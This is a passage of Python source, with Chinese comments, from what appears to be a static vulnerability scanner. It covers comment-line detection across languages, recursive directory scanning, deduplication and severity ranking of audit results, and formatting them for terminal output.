            block_delimiters = ("/*", "*/")
        elif ext in (".js", ".ts", ".jsx", ".tsx", ".java", ".c", ".cpp",
                     ".h", ".hpp", ".cs", ".go", ".rs", ".swift", ".kt",
                     ".scala"):
            line_comment_prefixes = ["//"]
            block_delimiters = ("/*", "*/")
        elif ext in (".pl", ".rb"):
            line_comment_prefixes = ["#"]
        elif ext in (".asp", ".aspx", ".jsp"):
            line_comment_prefixes = ["//"]
            block_delimiters = ("/*", "*/")
        else:
            # Unknown extension — default to Python conventions
            line_comment_prefixes = ["#"]
            block_delimiters = None

        in_block: bool = False
        in_docstring: bool = False
        docstring_delim: str = ""

        for i, raw_line in enumerate(lines, start=1):
            stripped = raw_line.lstrip()

            # Track docstring blocks (Python only)
            if ext.startswith(".py"):
                if not in_docstring:
                    for dq in docstring_quotes:
                        if dq in raw_line:
                            count = raw_line.count(dq)
                            # Single-line docstring: """..."""
                            if count >= 2:
                                comment_lines.add(i)
                                continue
                            # Multi-line docstring start
                            in_docstring = True
                            docstring_delim = dq
                            comment_lines.add(i)
                            break
                else:
                    comment_lines.add(i)
                    if docstring_delim in raw_line:
                        in_docstring = False
                        docstring_delim = ""
                if in_docstring:
                    continue

            # Track block comments (/* ... */)
            if block_delimiters:
                if in_block:
                    comment_lines.add(i)
                    if block_delimiters[1] in raw_line:
                        in_block = False
                    continue
                # Start of block comment
                bd_start = block_delimiters[0]
                bd_end = block_delimiters[1]
                if bd_start in raw_line:
                    comment_lines.add(i)
                    # Single-line block: /* ... */
                    if bd_end in raw_line[raw_line.find(bd_start) + len(bd_start):]:
                        pass  # opens and closes on same line
                    else:
                        in_block = True
                    continue

            # Line comments: line starts with prefix after optional whitespace
            for prefix in line_comment_prefixes:
                if stripped.startswith(prefix):
                    comment_lines.add(i)
                    break

        self._comment_lines = comment_lines
        return comment_lines


# ---------------------------------------------------------------------------
# run() — 便捷入口
# ---------------------------------------------------------------------------


def run(
    repo_path_or_source: str | Path,
    languages: list[str] | None = None,
) -> list[AuditResult]:
    """扫描文件或目录，返回排序去重后的审计结果

    Args:
        repo_path_or_source:
            - 文件路径 → 扫描单个文件
            - 目录路径 → 递归扫描目录下所有常见源码文件
            - 源码字符串 → 按字符串扫描
        languages: 可选语言过滤（传递给 Scanner.scan）

    Returns:
        按严重性 + 置信度排序的 AuditResult 列表。
    """
    path = Path(repo_path_or_source)

    # 情况 1: 路径是一个目录 → 递归扫描
    if path.is_dir():
        return _run_directory(path, languages)

    # 情况 2: 路径是一个文件
    if path.is_file():
        scanner = Scanner(source=path)
        return merge_results(scanner.scan(languages=languages))

    # 情况 3: 当作源码字符串
    scanner = Scanner(source=str(repo_path_or_source))
    return merge_results(scanner.scan(languages=languages))


def _run_directory(
    directory: Path,
    languages: list[str] | None = None,
) -> list[AuditResult]:
    """递归扫描目录中所有常见源码文件"""
    SUPPORTED_EXTENSIONS: set[str] = {
        ".php",
        ".py",
        ".js",
        ".java",
        ".pl",
        ".rb",
        ".go",
        ".rs",
        ".c",
        ".cpp",
        ".h",
        ".hpp",
        ".cs",
        ".swift",
        ".kt",
        ".scala",
        ".ts",
        ".tsx",
        ".jsx",
        ".asp",
        ".aspx",
        ".jsp",
        ".phtml",
        ".ctp",
        ".tpl",
    }
    all_results: list[AuditResult] = []

    for ext in SUPPORTED_EXTENSIONS:
        # Windows: NTFS reparse points → BSOD risk, use single-level glob
        file_iter = directory.rglob(f"*{ext}") if not IS_WINDOWS else directory.glob(f"*{ext}")
        for fpath in sorted(file_iter):
            if fpath.is_symlink():
                continue
            try:
                scanner = Scanner(source=fpath)
                all_results.extend(scanner.scan(languages=languages))
            except (OSError, UnicodeDecodeError, ValueError):
                # 跳过无法读取的文件
                pass

    return merge_results(all_results)


# ---------------------------------------------------------------------------
# merge_results() — 去重 + 排序
# ---------------------------------------------------------------------------


def merge_results(results: list[AuditResult]) -> list[AuditResult]:
    """对审计结果进行去重和排序

    去重规则: (vulnerability, line) 唯一，保留置信度最高的记录。
    排序规则: 先按严重性（critical → high → medium → low），
             同级按置信度降序排列。

    Args:
        results: 原始审计结果列表。

    Returns:
        排序去重后的新列表。
    """
    # 去重: (漏洞名, 行号) → 保留置信度最高
    seen: dict[tuple[str, int], AuditResult] = {}
    for r in results:
        key = (r.vulnerability, r.line)
        if key not in seen or r.confidence > seen[key].confidence:
            seen[key] = r

    # 排序: severity asc → confidence desc
    return sorted(
        seen.values(),
        key=lambda r: (
            _SEVERITY_ORDER.get(r.severity, 99),
            -r.confidence,
        ),
    )


# ---------------------------------------------------------------------------
# 辅助工具
# ---------------------------------------------------------------------------


def format_results(results: list[AuditResult], verbose: bool = False) -> str:
    """将审计结果格式化为可读字符串（终端输出用）"""
    if not results:
        return "[*] 未发现漏洞。"

    lines: list[str] = []
    lines.append(f"[+] 发现 {len(results)} 个漏洞:\n")

    for i, r in enumerate(results, 1):
        lines.append(f"  #{i}  [{r.severity.upper():>8}] {r.vulnerability}")
        lines.append(f"       文件: {r.snippet[:60]}")
        lines.append(f"       行号: {r.line}")
        if verbose:
            lines.append(f"       描述: {r.description}")
            lines.append(f"       置信度: {r.confidence:.0%}")
            lines.append(f"       CWE: {r.cwe}")
            lines.append(f"       Payload: {r.suggested_payload}")
            if r.references:
                lines.append(f"       参考: {', '.join(r.references)}")
        lines.append("")

    return "\n".join(lines)
